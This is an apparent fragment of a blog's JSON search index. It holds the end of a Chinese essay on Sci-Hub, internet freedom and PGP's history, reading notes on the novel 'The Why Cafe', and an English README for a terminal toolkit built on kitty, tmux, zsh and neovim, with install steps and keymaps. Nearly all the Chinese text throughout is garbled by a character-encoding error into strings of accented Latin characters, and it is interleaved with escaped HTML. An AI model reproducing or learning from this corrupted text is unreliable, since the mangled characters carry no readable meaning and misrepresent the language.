Library Administration çš„ä¸€ä½ç¼–å§”ä¼šæˆå‘˜å†™é“ï¼Œåœ¨Aaronæ­»åï¼Œâ€œåœ¨éå¼€æ”¾è·å–åˆŠç‰©ä¸Šå‘è¡¨è¦å—åˆ°è‰¯çŸ¥çš„è°´è´£â€ã€‚å¯ä»¥è¯´Scihubå°±æ˜¯è¿™è‚¡è¿åŠ¨çš„ç»§æ‰¿è€…ã€‚\u003c/p\u003e\n\u003cp\u003eä¸å…¶ä»–é¼“å¹scihubçš„è¨€è®ºç›¸æ¯”ï¼Œæˆ‘å¹¶ä¸æ˜¯å¾ˆçœ‹é‡å®ƒåœ¨å…è´¹è·å–è®ºæ–‡ä¸Šçš„æ•ˆæœï¼Œå°±ä¸ªäººçš„æœ‰é™ä½“éªŒè€Œè¨€ï¼Œæˆ‘æŸ¥è¯¢çš„æ–‡çŒ®ä¸­ä¾æ—§æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯scihubæ²¡æœ‰æ”¶å½•çš„ï¼Œè€Œç ”ç©¶ç”ŸæœŸé—´ï¼Œé€šè¿‡å­¦æ ¡çš„æ ¡å›­ç½‘å°±å¯ä»¥ä¸‹è½½åˆ°é‚£äº›éœ€è¦ä»˜è´¹è®¢é˜…çš„è®ºæ–‡ï¼Œä¹Ÿæ²¡æœ‰ä½¿ç”¨scihubçš„åˆšéœ€ï¼Œä¸è¿‡å®ƒçš„å­˜åœ¨å’Œå‘å±•ä¾æ—§æ˜¯å€¼å¾—è¢«è®¤å¯å’Œæ”¯æŒçš„ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†å®ƒä¸ºäº†é‚£äº›æ²¡æœ‰æ¡ä»¶çš„ç§‘ç ”äººå‘˜åšå‡ºçš„è™½ç„¶æœ‰é™ä½†åˆ‡å®å­˜åœ¨çš„å¹³æƒåŠªåŠ›ï¼Œæ›´æ˜¯ä¸ºäº†é‚£ä»½ä¼ æ‰¿äº†ä¸‰åä½™å¹´çš„ç²¾ç¥å›¾è…¾ï¼Œå®ƒè®©äººä»¬åœ¨é™ˆè…çš„å•†ä¸šä¸–ç•Œä¸­ï¼Œä¾æ—§èƒ½å¤Ÿçœ‹åˆ°ç†æƒ³ä¸»ä¹‰å’Œæ—©æœŸäº’è”ç½‘è‡ªç”±ç²¾ç¥çš„ä½™è¾‰ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼ŒAlexandra ä¾æ—§é¢ä¸´ç€ä¸¥å³»çš„çŸ¥è¯†å°é”å’Œæ³•å¾‹é£é™©ï¼Œä»¥åŠæ›´ç°å®çš„ç»æµé—®é¢˜ã€‚å°½ç®¡æœ‰ä¸å°‘å¿—æ„¿è€…è¯•å›¾ä¼ æ’­å’Œå¸®åŠ©Scihubï¼Œä½†èŒƒå›´æœ‰é™ï¼Œæ•ˆæœç”šå¾®ï¼Œ éƒ¨åˆ†åŸå› åœ¨äºï¼Œäº’è”ç½‘çš„æ–°ç”Ÿä¸€ä»£æ­£é€æ¸æŒæ¡è¯è¯­æƒï¼Œè€Œä»–ä»¬ç”Ÿæ´»åœ¨ä¸€ä¸ªè¢«å‰è¾ˆ\u0026quot;ä¿®æ­£\u0026quot;è¿‡äº†çš„ç½‘ç»œä¸–ç•Œï¼Œ æ²¡æœ‰ç»å†è¿‡çŸ›ç›¾çš„å†²çªå’Œå†å²æ€§çš„è¿åŠ¨ï¼Œç¼ºä¹å¯¹ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰çš„è®¤çŸ¥å’Œä½“ä¼šï¼Œæœ€å¤šä¾¿æ˜¯ç§°é“ä¸€å£°Respectã€‚ å¥½æ¯”åªæœ‰å½“ä½ æ˜¯ä¸Šä¸–çºªä¸‰å››åå¹´ä»£çš„ä¸­å›½å†œæ°‘æ—¶ï¼Œæ‰èƒ½çœŸæ­£ä½“ä¼šåˆ°ä»Šå¤©æ”¿æ²»ä¹¦é‡Œçš„é™ˆè¯æ»¥è°ƒåœ¨å½“å¹´ç¡®å®æ˜¯æ•‘å›½å›¾å­˜çš„å­˜åœ¨ã€‚\u003c/p\u003e\n\u003cp\u003eç¤¾ä¼šçš„å¥å¿˜ä¸ä»…ä¸ºçŸ¥è¯†å¹³æƒå¸¦æ¥äº†å›°éš¾ï¼Œä¹Ÿè®©å…¶ä»–æ›¾ç»è¢«\u0026quot;ä¿®å¤\u0026quot;è¿‡çš„é‚£äº›é—®é¢˜é‡æ–°æµ®ç°ï¼Œç”šè‡³å˜å¾—æ›´åŠ é«˜æ˜å’Œæ£˜æ‰‹ï¼Œå› ä¸ºæ”¿åºœå’Œå•†ä¸šå…¬å¸å·²ç»å­¦ä¼šæ¸©æ°´ç…®é’è›™çš„æ¨¡å¼æ…¢æ…¢ä¾µçŠ¯ç”¨æˆ·ï¼Œè€Œæ—¶é—´å’Œå¥å¿˜æ˜¯ä»–ä»¬çš„ç›Ÿå‹ã€‚è¯•é—®æœ‰è°è®°å¾—è°·æ­Œæ›¾ç»åœ¨è‡ªå·±çš„è¡Œä¸ºå‡†åˆ™å¼€å¤´ä¸­æ‰¿è¯ºè¿‡\u0026quot;Don\u0026rsquo;t be evil\u0026quot;å‘¢? å¤§éƒ¨åˆ†çš„äººä»…ä»…å…³å¿ƒè‡ªå·±çš„éœ€æ±‚èƒ½ä¸èƒ½æ»¡è¶³ï¼Œè‡³äºé‚£\u0026quot;å°å°\u0026quot;çš„éšç§ä¾µçŠ¯? æˆ–è®¸è®©äººä¸å¿«ï¼Œä½†é‚£åˆå¦‚ä½•?\u003c/p\u003e\n\u003cp\u003eå¯ä»¥è¯´ï¼Œäº’è”ç½‘çš„å†å²ï¼Œå°±æ˜¯äººä»¬ç”¨éšç§å’Œè‡ªç”±æ¢å–ä¾¿åˆ©çš„å†å²ï¼Œå³ä¾¿è¿™ç§äº¤æ˜“æœ‰æ—¶å€™å¹¶ä¸ç­‰ä»·ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./google.png\" alt=\"google\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå›åˆ°web3ï¼Œè¿™æ˜¯ä¸€ä¸ªé»‘æš—æ£®æ—ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå……æ»¡äº†æœºä¼šçš„åœ°æ–¹ã€‚é™¤äº†ä¸ºScihubçš„æ¨å¹¿å¸¦æ¥äº†ä¾¿åˆ©ä¹‹å¤–ï¼Œå»ä¸­å¿ƒåŒ–æŠ€æœ¯çš„æœ¬è´¨æ ¸å¿ƒï¼Œä¹Ÿå°±æ˜¯åŠ å¯†æŠ€æœ¯ï¼ŒåŒæ ·æ˜¯å½“å¹´ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰çš„äº§ç‰©ï¼Œå…¶èƒŒåçš„ä¸€äº›æ•…äº‹ä¹ŸåŒæ ·é¢‡å…·ä¼ å¥‡è‰²å½©ã€‚\u003c/p\u003e\n\u003cp\u003e1991å¹´ï¼Œè²å°”Â·é½é»˜æ›¼ä¸ºäº†è®©æ‰€æœ‰äººå¯ä»¥å®‰å…¨è®¿é—®BBSå’Œå­˜å‚¨ä¿¡æ¯ï¼Œå¼€å‘äº†ç”¨äºé€šè®¯åŠ å¯†çš„åº”ç”¨ç¨‹åºPGP(Pretty Good Privacy)å¹¶å‘å¸ƒåœ¨äº’è”ç½‘ä¸Šä¾›äººå…è´¹ä½¿ç”¨ã€‚è€Œåœ¨å½“æ—¶çš„ç¾å›½ï¼Œä½¿ç”¨å¤§äº40ä½å¯†é’¥çš„åŠ å¯†ç³»ç»Ÿè¢«è§†ä¸ºå†›éœ€å“ã€‚PGPçš„å¯†é’¥é•¿åº¦è¿œè¿œè¶…å‡ºäº†è¿™ä¸€é™åˆ¶ï¼Œå› æ­¤æ”¿åºœä»¥\u0026quot;æ²¡æœ‰æˆæƒçš„å†›éœ€å“å‡ºå£\u0026quot;ä¸ºåå¯¹ä»–å‘èµ·è°ƒæŸ¥ï¼Œä½†é½é»˜æ›¼ä½¿ç”¨äº†ä¸€ä¸ªå¤©æ‰èˆ¬çš„æƒ³æ³•å»å¯¹æŠ—è§„å®š: ä»–å°†PGPçš„æºä»£ç å‡ºç‰ˆä¸ºä¸€æœ¬ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eä¸å†›éœ€å“å‡ºå£ä¸åŒï¼Œä¹¦æœ¬å‡ºå£å’Œä¼ æ’­ç¬¦åˆç¾å›½å®ªæ³•ç¬¬ä¸€ä¿®æ­£æ¡ˆä¸­çš„è¨€è®ºè‡ªç”±éƒ¨åˆ†ï¼Œå› è€Œå—åˆ°ä¿æŠ¤ï¼Œæ³•é™¢å› æ­¤åˆ¤å®šé½é»˜æ›¼æ— ç½ªã€‚è¿™ä¸ªæ¡ˆä»¶æ·±åˆ»å½±å“äº†åæ¥ç±»ä¼¼æ¡ˆä»¶çš„å¸æ³•è£å®šï¼Œè€ŒPGPä¾æ—§ç»§ç»­å‘æŒ¥ç€éšç§ä¿æŠ¤çš„å¼ºå¤§ä½œç”¨ï¼Œå®ƒçš„åè¾ˆGPG (GnuPG) å¸®åŠ© Edward Joseph Snowden åœ¨é€ƒäº¡æœŸé—´è”ç³»æ–°é—»ç•Œï¼Œä¸€ä¸¾æ­å‘äº†2013å¹´å¼•çˆ†å…¨çƒçš„ç¾å›½æ£±é•œè®¡åˆ’ã€‚\u003c/p\u003e","title":"ä»$scihubåˆ°è‡ªç”±ç½‘ç»œæ„å¿—"},{"content":" å°è¯´çš„ä¸»äººå…¬åœ¨å¶é‡ä¸€é—´å¥‡å¦™çš„å’–å•¡é¦†å, é€šè¿‡åº—å‘˜ä»¬çš„å¼•å¯¼å¼€å§‹æ€è€ƒèµ·äº†äººç”Ÿçš„æ„ä¹‰å’Œä»·å€¼, å¹¶æœ€ç»ˆå¾—åˆ°äº†å¯å‘.\nè¿™é‡Œè®°å½•ä¹¦ä¸­å‡ ä¸ªæœ‰æ„æ€çš„ç‰‡æ®µ.\næœ‰æ„ä¹‰çš„ä¸‰ä¸ªé—®é¢˜:\nä½ ä¸ºä»€ä¹ˆæ¥è¿™é‡Œ ä½ å®³æ€•æ­»äº¡å— ä½ æ»¡è¶³å— æå‡ºé—®é¢˜, äººçš„å¿ƒçµæ‰ä¼šå»è¿½å¯»ç­”æ¡ˆ\næ¯ä¸€å¤©éƒ½æ˜¯ä¸€ä¸ªå®ç°äººç”Ÿæ„ä¹‰çš„æœºä¼šï¼Œå¯ä»¥åšæˆ‘æƒ³åšçš„äº‹ã€‚ä¸éœ€è¦ç­‰åˆ°â€˜é€€ä¼‘â€™\næˆ‘ä»¬æ¯å¤©éƒ½æš´éœ²åœ¨å¤§é‡è¥é”€ä¿¡æ¯ä¸­ï¼Œå¦‚æœä¸è°¨æ…ç‚¹å„¿ï¼Œæˆ‘ä»¬è‚¯å®šä¼šæŠŠè‡ªå·±çš„å¹¸ç¦å’Œæ»¡è¶³å¯„æ‰˜åœ¨æŸæ ·äº§å“æˆ–æœåŠ¡ä¸Šã€‚æœ€åï¼Œæˆ‘ä»¬ä¼šé™·å…¥ä¸€ç§è´¢åŠ¡å›°å¢ƒï¼Œå¿…é¡»ä¸æ–­å»åšäº‹æƒ…å»æŒ£é’±ï¼Œå°½ç®¡é‚£äº›äº‹æƒ…ä¸æ˜¯æˆ‘ä»¬çœŸæ­£æƒ³åšçš„ã€‚è€Œè¿™ä¼šé€ æˆæ¶æ€§å¾ªç¯\nè½¬å˜å¿ƒæ€çš„é‡ç‚¹åœ¨äºï¼Œä½ è¦æ¸…æ¥šï¼ŒæŸæ ·ä¸œè¥¿æ˜¯å¦èƒ½è®©ä½ çš„ç”Ÿæ´»æ›´åœ†æ»¡ï¼Œç”±ä½ è‡ªå·±è¯´äº†ç®—ï¼Œå’Œåˆ«äººå‘Šè¯‰ä½ å®ƒåœ†ä¸åœ†æ»¡æ— å…³ã€‚\næƒ³æƒ³, å¦‚æœæˆ‘ä¸éœ€è¦â€˜é€ƒç¦»â€™æˆ– â€˜å‡å‹â€™ï¼Œé‚£æˆ‘è¿˜ä¼šæƒ³ä¹°é‚£äº›ä¸œè¥¿å—ï¼Ÿå¦‚æœæˆ‘ä¸€ç›´åœ¨åšæˆ‘æƒ³åšçš„äº‹ï¼Œé‚£ä¹ˆæˆ‘åº”è¯¥æ²¡ä»€ä¹ˆå¯â€˜é€ƒç¦»â€™çš„ï¼Œä¹Ÿæ²¡é‚£ä¹ˆå¤šå‹åŠ›éœ€è¦é‡Šæ”¾, é‚£ä¹ˆæˆ‘çœŸçš„éœ€è¦é€šè¿‡å·¥ä½œå»èµšé‚£ä¹ˆå¤šé’±å—?\næ²‰æµ¸åœ¨çˆ±å¥½ä¸­çš„å¤§å¤šæ•°äººæ ¹æœ¬å°±ä¸å¤ªå…³å¿ƒè‡ªå·±è¿æ°”å¥½ä¸å¥½ã€‚ä»–ä»¬åªçŸ¥é“ï¼Œå½“è‡ªå·±ä¸ºå®ç°å­˜åœ¨æ„ä¹‰è€ŒåŠªåŠ›æ—¶ï¼Œå¹¸è¿çš„å·§åˆå°±ä¼šè‡ªç„¶å‡ºç°ï¼Œä»–ä»¬ç®¡è¿™ä¸ªå«é¡ºå…¶è‡ªç„¶ã€‚\næœ‰å¾ˆå¤šäººä¸ºäº†é’±æˆ–æƒåŠ›ï¼Œè¯´æœå…¶ä»–äººå»ç›¸ä¿¡ï¼Œä»–ä»¬çš„äº§å“æˆ–æœåŠ¡æ˜¯å®ç°äººç”Ÿåœ†æ»¡çš„å…³é”®ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœå¤§å®¶éƒ½æ„è¯†åˆ°ï¼Œæˆ‘ä»¬çš„æ»¡è¶³æ„Ÿå…¶å®æŒæ¡åœ¨è‡ªå·±æ‰‹ä¸­ï¼Œé‚£å‰é¢é‚£ç§äººå°±ä¼šå—åˆ°å·¨å¤§çš„å¨èƒã€‚è¯´æœä»–äººçš„é‚£äº›äººå°†å¤±å»ä»–ä»¬çš„åŠ›é‡ã€‚å¯¹äºè¿™ç±»äººï¼Œå¤±å»å¯¹ä»–äººçš„å½±å“åŠ›å¯ä¸æ˜¯ä»€ä¹ˆå¥½äº‹æƒ…ã€‚\nåªæœ‰ä½ çœŸæ­£äº†è§£è‡ªå·±å­˜åœ¨çš„æ„ä¹‰ã€‚æ°¸è¿œä¸è¦å› ä¸ºå…¶ä»–äººæˆ–äº‹å¤±å»å¯¹è‡ªå·±å‘½è¿çš„æŒæ§ã€‚è¦ç§¯æåœ°é€‰æ‹©è‡ªå·±çš„äººç”Ÿé“è·¯ï¼Œä¸ç„¶å°±åªèƒ½è¢«åŠ¨æ¥å—å®‰æ’ã€‚\nå¦‚ä½•å¯»æ‰¾äººç”Ÿæ„ä¹‰å’Œçƒ­çˆ±çš„äº‹ç‰©:\näººç”Ÿæ„ä¹‰çš„ç­”æ¡ˆï¼Œå…¨ä¸–ç•Œåªæœ‰æˆ‘ä»¬è‡ªå·±å¯ä»¥å†³å®šã€‚æ‰€ä»¥å¾ˆå¤šäººéƒ½åœ¨è¿½å¯»ç­”æ¡ˆçš„è¿‡ç¨‹ä¸­é€‰æ‹©ç‹¬å¤„ã€‚è¦æ˜¯ä½ æ•´å¤©è¢«èµ„è®¯å’Œä¿¡æ¯è½°ç‚¸ï¼Œå°±å¾ˆéš¾é›†ä¸­ç²¾åŠ›æ€è€ƒé—®é¢˜ã€‚ å¤šå»æ¥è§¦ä¸åŒçš„æ–°é²œäº‹ç‰©ã€‚æœ‰äººå‘ç°ï¼Œä¸€æ—¦ä»–ä»¬æœ‰æ–°ä½“éªŒæˆ–è€…æ¥è§¦åˆ°æ–°ç†å¿µï¼Œæœ‰äº›ä½“éªŒæˆ–ç†å¿µå°±ä¼šè®©ä»–ä»¬äº§ç”Ÿå…±é¸£ã€‚é‡åˆ°ä»–ä»¬çƒ­çˆ±çš„äº‹ç‰©æ—¶ï¼Œå¾ˆå¤šäººéƒ½æœ‰ç”Ÿç†ååº”ï¼Œæ¯”å¦‚æ±—æ¯›å€’ç«–ã€è„Šæ¢éª¨ä»¿ä½›è§¦ç”µã€å–œæè€Œæ³£ç­‰ç­‰ã€‚è¿˜æœ‰äººä¼šäº§ç”Ÿä¸€ç§â€˜å°±æ˜¯å®ƒâ€™çš„æ„Ÿè§‰ã€‚è¿™äº›éƒ½æ˜¯æ‰¾å‡ºè‡ªå·±å­˜åœ¨æ„ä¹‰çš„çº¿ç´¢ã€‚ ","permalink":"https://dragonbox.top/posts/read-the-why-cafe/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå°è¯´çš„ä¸»äººå…¬åœ¨å¶é‡ä¸€é—´å¥‡å¦™çš„å’–å•¡é¦†å, é€šè¿‡åº—å‘˜ä»¬çš„å¼•å¯¼å¼€å§‹æ€è€ƒèµ·äº†äººç”Ÿçš„æ„ä¹‰å’Œä»·å€¼, å¹¶æœ€ç»ˆå¾—åˆ°äº†å¯å‘.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eè¿™é‡Œè®°å½•ä¹¦ä¸­å‡ ä¸ªæœ‰æ„æ€çš„ç‰‡æ®µ.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eæœ‰æ„ä¹‰çš„ä¸‰ä¸ªé—®é¢˜:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eä½ ä¸ºä»€ä¹ˆæ¥è¿™é‡Œ\u003c/li\u003e\n\u003cli\u003eä½ å®³æ€•æ­»äº¡å—\u003c/li\u003e\n\u003cli\u003eä½ æ»¡è¶³å—\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæå‡ºé—®é¢˜, äººçš„å¿ƒçµæ‰ä¼šå»è¿½å¯»ç­”æ¡ˆ\u003c/p\u003e\n\u003cp\u003eæ¯ä¸€å¤©éƒ½æ˜¯ä¸€ä¸ªå®ç°äººç”Ÿæ„ä¹‰çš„æœºä¼šï¼Œå¯ä»¥åšæˆ‘æƒ³åšçš„äº‹ã€‚ä¸éœ€è¦ç­‰åˆ°â€˜é€€ä¼‘â€™\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬æ¯å¤©éƒ½æš´éœ²åœ¨å¤§é‡è¥é”€ä¿¡æ¯ä¸­ï¼Œå¦‚æœä¸è°¨æ…ç‚¹å„¿ï¼Œæˆ‘ä»¬è‚¯å®šä¼šæŠŠè‡ªå·±çš„å¹¸ç¦å’Œæ»¡è¶³å¯„æ‰˜åœ¨æŸæ ·äº§å“æˆ–æœåŠ¡ä¸Šã€‚æœ€åï¼Œæˆ‘ä»¬ä¼šé™·å…¥ä¸€ç§è´¢åŠ¡å›°å¢ƒï¼Œå¿…é¡»ä¸æ–­å»åšäº‹æƒ…å»æŒ£é’±ï¼Œå°½ç®¡é‚£äº›äº‹æƒ…ä¸æ˜¯æˆ‘ä»¬çœŸæ­£æƒ³åšçš„ã€‚è€Œè¿™ä¼šé€ æˆæ¶æ€§å¾ªç¯\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eè½¬å˜å¿ƒæ€çš„é‡ç‚¹åœ¨äºï¼Œä½ è¦æ¸…æ¥šï¼ŒæŸæ ·ä¸œè¥¿æ˜¯å¦èƒ½è®©ä½ çš„ç”Ÿæ´»æ›´åœ†æ»¡ï¼Œç”±ä½ è‡ªå·±è¯´äº†ç®—ï¼Œå’Œåˆ«äººå‘Šè¯‰ä½ å®ƒåœ†ä¸åœ†æ»¡æ— å…³ã€‚\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæƒ³æƒ³, å¦‚æœæˆ‘ä¸éœ€è¦â€˜é€ƒç¦»â€™æˆ– â€˜å‡å‹â€™ï¼Œé‚£æˆ‘è¿˜ä¼šæƒ³ä¹°é‚£äº›ä¸œè¥¿å—ï¼Ÿå¦‚æœæˆ‘ä¸€ç›´åœ¨åšæˆ‘æƒ³åšçš„äº‹ï¼Œé‚£ä¹ˆæˆ‘åº”è¯¥æ²¡ä»€ä¹ˆå¯â€˜é€ƒç¦»â€™çš„ï¼Œä¹Ÿæ²¡é‚£ä¹ˆå¤šå‹åŠ›éœ€è¦é‡Šæ”¾, é‚£ä¹ˆæˆ‘çœŸçš„éœ€è¦é€šè¿‡å·¥ä½œå»èµšé‚£ä¹ˆå¤šé’±å—?\u003c/p\u003e\n\u003cp\u003eæ²‰æµ¸åœ¨çˆ±å¥½ä¸­çš„å¤§å¤šæ•°äººæ ¹æœ¬å°±ä¸å¤ªå…³å¿ƒè‡ªå·±è¿æ°”å¥½ä¸å¥½ã€‚ä»–ä»¬åªçŸ¥é“ï¼Œå½“è‡ªå·±ä¸ºå®ç°å­˜åœ¨æ„ä¹‰è€ŒåŠªåŠ›æ—¶ï¼Œå¹¸è¿çš„å·§åˆå°±ä¼šè‡ªç„¶å‡ºç°ï¼Œä»–ä»¬ç®¡è¿™ä¸ªå«é¡ºå…¶è‡ªç„¶ã€‚\u003c/p\u003e\n\u003cp\u003eæœ‰å¾ˆå¤šäººä¸ºäº†é’±æˆ–æƒåŠ›ï¼Œè¯´æœå…¶ä»–äººå»ç›¸ä¿¡ï¼Œä»–ä»¬çš„äº§å“æˆ–æœåŠ¡æ˜¯å®ç°äººç”Ÿåœ†æ»¡çš„å…³é”®ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœå¤§å®¶éƒ½æ„è¯†åˆ°ï¼Œæˆ‘ä»¬çš„æ»¡è¶³æ„Ÿå…¶å®æŒæ¡åœ¨è‡ªå·±æ‰‹ä¸­ï¼Œé‚£å‰é¢é‚£ç§äººå°±ä¼šå—åˆ°å·¨å¤§çš„å¨èƒã€‚è¯´æœä»–äººçš„é‚£äº›äººå°†å¤±å»ä»–ä»¬çš„åŠ›é‡ã€‚å¯¹äºè¿™ç±»äººï¼Œå¤±å»å¯¹ä»–äººçš„å½±å“åŠ›å¯ä¸æ˜¯ä»€ä¹ˆå¥½äº‹æƒ…ã€‚\u003c/p\u003e\n\u003cp\u003eåªæœ‰ä½ çœŸæ­£äº†è§£è‡ªå·±å­˜åœ¨çš„æ„ä¹‰ã€‚æ°¸è¿œä¸è¦å› ä¸ºå…¶ä»–äººæˆ–äº‹å¤±å»å¯¹è‡ªå·±å‘½è¿çš„æŒæ§ã€‚è¦ç§¯æåœ°é€‰æ‹©è‡ªå·±çš„äººç”Ÿé“è·¯ï¼Œä¸ç„¶å°±åªèƒ½è¢«åŠ¨æ¥å—å®‰æ’ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•å¯»æ‰¾äººç”Ÿæ„ä¹‰å’Œçƒ­çˆ±çš„äº‹ç‰©:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eäººç”Ÿæ„ä¹‰çš„ç­”æ¡ˆï¼Œå…¨ä¸–ç•Œåªæœ‰æˆ‘ä»¬è‡ªå·±å¯ä»¥å†³å®šã€‚æ‰€ä»¥å¾ˆå¤šäººéƒ½åœ¨è¿½å¯»ç­”æ¡ˆçš„è¿‡ç¨‹ä¸­é€‰æ‹©\u003cstrong\u003eç‹¬å¤„\u003c/strong\u003eã€‚è¦æ˜¯ä½ æ•´å¤©è¢«èµ„è®¯å’Œä¿¡æ¯è½°ç‚¸ï¼Œå°±å¾ˆéš¾é›†ä¸­ç²¾åŠ›æ€è€ƒé—®é¢˜ã€‚\u003c/li\u003e\n\u003cli\u003eå¤šå»æ¥è§¦ä¸åŒçš„æ–°é²œäº‹ç‰©ã€‚æœ‰äººå‘ç°ï¼Œä¸€æ—¦ä»–ä»¬æœ‰æ–°ä½“éªŒæˆ–è€…æ¥è§¦åˆ°æ–°ç†å¿µï¼Œæœ‰äº›ä½“éªŒæˆ–ç†å¿µå°±ä¼šè®©ä»–ä»¬äº§ç”Ÿå…±é¸£ã€‚é‡åˆ°ä»–ä»¬çƒ­çˆ±çš„äº‹ç‰©æ—¶ï¼Œå¾ˆå¤šäººéƒ½æœ‰ç”Ÿç†ååº”ï¼Œæ¯”å¦‚æ±—æ¯›å€’ç«–ã€è„Šæ¢éª¨ä»¿ä½›è§¦ç”µã€å–œæè€Œæ³£ç­‰ç­‰ã€‚è¿˜æœ‰äººä¼šäº§ç”Ÿä¸€ç§â€˜å°±æ˜¯å®ƒâ€™çš„æ„Ÿè§‰ã€‚è¿™äº›éƒ½æ˜¯æ‰¾å‡ºè‡ªå·±å­˜åœ¨æ„ä¹‰çš„çº¿ç´¢ã€‚\u003c/li\u003e\n\u003c/ul\u003e","title":"ã€Šåœ¨ä¸–ç•Œå°½å¤´çš„å’–å•¡é¦†ã€‹è¯»ä¹¦ç¬”è®°"},{"content":" å£°æ˜: æ­¤é¡¹ç›®ä¸é‚£äº›å£°ç§°è¦å–ä»£vscodeç­‰GUIå·¥å…·çš„é…ç½®ä¸åŒ, è€Œæ˜¯åŠ›å›¾å¡«è¡¥è¿™äº›å¤§å‹å¼€å‘å·¥å…·åœ¨ç»ˆç«¯ç¯å¢ƒä¸‹çš„ç©ºç™½\né¡¹ç›®åœ°å€: https://github.com/ch3n9w/dev, åç»­READMEæ›´æ–°ä¸ä¼šåŒæ­¥åˆ°è¿™ç¯‡åšå®¢, ä½†æ˜¯å¤§ä½“ä¸Šç§‰æ‰¿çš„æ€æƒ³ä¸ä¼šæ”¹å˜: æç®€ã€å¯ç”¨ä»¥åŠæœ€å°‘åŒ–å¿ƒæ™ºè´Ÿæ‹…\nDevelopment Toolkit ğŸ“¡ A comprehensive and user-friendly development toolkit to boost up your productivity ğŸš€.\nterminal emulator: kitty shell: zsh editor: neovim terminal filemanager: yazi multiplexers: tmux or kitty Try docker run -it --rm --name dev ch4xer/dev:latest /bin/zsh Install git clone https://github.com/ch3n9w/dev cd dev # install dependency software and install configuration ./scripts/install-software.sh Alternatively (if you dont want to install all of them), you can copy the configuration directory you like to XDG_CONFIG_HOME (commonly ~/.config), for example:\nnvim -\u0026gt; ~/.config/nvim kitty -\u0026gt; ~/.config/kitty tmux -\u0026gt; ~/.config/tmux yazi -\u0026gt; ~/.config/yazi zsh/zsh -\u0026gt; ~/.config/zsh zsh/zshrc -\u0026gt; ~/.zshrc Noteable Info Kitty use Ctrl and Shift as modifier key for all shortcuts use JetbrainMono Nerd Font and LXGW WenKai as font Tmux use Alt and Ctrl as modifier key for all shortcuts set Alt-a as prefix key instead of Ctrl-b use tmux-continuum and resurrect to restore sessions. Zsh you can add software settings in zsh/zsh/software disable vim mode. Neovim Only use \u0026lt;=30 plugins to make Neovim tiny and good enough for editing Keymap Software Key Effect kitty C-t new tab kitty C-CR new window kitty C-w delete window kitty C-h/j/k/l focus other window kitty C-S-h/j/k/l move window kitty C-PgUp/PgDn goto other tab kitty C-S-PgUp/PgDn move tab kitty C-=/- adjust font size kitty f1 search content kitty f11 toggle zoom zsh C-r call filemanager zsh C-e open filemanager-gui zsh C-Backspace delete word backward yazi gh go to home (~) yazi gd go to ~/Documents yazi gn go to ~/Downloads yazi H/L go to previous/next visited directory yazi a create file/dir yazi r rename file or directory yazi . show hidden file yazi ; execute shell command yazi y copy yazi d cut yazi p paste yazi D move to trash yazi Delete rm yazi f search and jump with fzf yazi z jump with zoxide tmux M-a prefix key tmux M-h/j/k/l go to other pane tmux M-q kill pane tmux M-C-j/k swap with other panes tmux M-x split window horizontally tmux M-C-x split window vertically tmux M-f toggle zoom tmux M-t create new window tmux M-C-t rename window tmux M-PgUp/PgDn go to previous/next window tmux M-C-PgUp/PgDn swap with previous/next window tmux M-s choose session tmux M-C-s rename session tmux M-n create new session neovim q quit window/neovim neovim Q record macro neovim C-a select all (normal mode) neovim H/L go to the begin/end of line neovim Tab move to other window neovim ; enter commandline mode neovim g= format document neovim 2-LeftMouse/CR toggle fold neovim sw fuzzy search word neovim sf fuzzy search filename neovim z fuzzy search opened buffers neovim ga (lsp) code action neovim ge (lsp) show diagnostics in line neovim gh (lsp) get document neovim gn (lsp) rename symbol neovim gd (lsp) go to definition neovim gr (lsp) find reference neovim C-/ comment line neovim f flash jump neovim Tab/S-Tab code completions neovim t File Tree ","permalink":"https://dragonbox.top/posts/tech-dev-2024/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå£°æ˜: æ­¤é¡¹ç›®ä¸é‚£äº›å£°ç§°è¦å–ä»£vscodeç­‰GUIå·¥å…·çš„é…ç½®ä¸åŒ, è€Œæ˜¯åŠ›å›¾å¡«è¡¥è¿™äº›å¤§å‹å¼€å‘å·¥å…·åœ¨ç»ˆç«¯ç¯å¢ƒä¸‹çš„ç©ºç™½\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eé¡¹ç›®åœ°å€: \u003ca href=\"https://github.com/ch3n9w/dev\"\u003ehttps://github.com/ch3n9w/dev\u003c/a\u003e, åç»­READMEæ›´æ–°ä¸ä¼šåŒæ­¥åˆ°è¿™ç¯‡åšå®¢, ä½†æ˜¯å¤§ä½“ä¸Šç§‰æ‰¿çš„æ€æƒ³ä¸ä¼šæ”¹å˜: æç®€ã€å¯ç”¨ä»¥åŠæœ€å°‘åŒ–å¿ƒæ™ºè´Ÿæ‹…\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"development-toolkit-\"\u003eDevelopment Toolkit ğŸ“¡\u003c/h1\u003e\n\u003cp\u003eA comprehensive and user-friendly development toolkit to boost up your productivity ğŸš€.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://ch3n9w.github.io/posts/tech-dev-2024/cover.png\" alt=\"Screenshot\"  /\u003e\n\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eterminal emulator: \u003ca 